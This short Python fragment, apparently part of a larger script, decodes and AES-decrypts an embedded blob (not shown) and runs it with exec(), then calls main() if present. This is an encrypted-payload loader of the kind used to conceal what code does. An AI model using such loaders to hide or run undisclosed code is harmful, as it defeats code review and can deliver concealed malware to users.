def decrypt_and_run():
    try:
        data = base64.b64decode(ENCRYPTED_CODE)

        iv = data[:16]
        encrypted_code = data[16:]

        cipher = AES.new(bytes(KEY), AES.MODE_CBC, iv)
        decrypted_code = unpad(cipher.decrypt(encrypted_code), AES.block_size)

        exec(compile(decrypted_code, "<string>", "exec"), globals())

        if "main" in globals():
            main()
            sys.exit(0)

    except Exception as e:
        print(f"❌ Error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    decrypt_and_run()
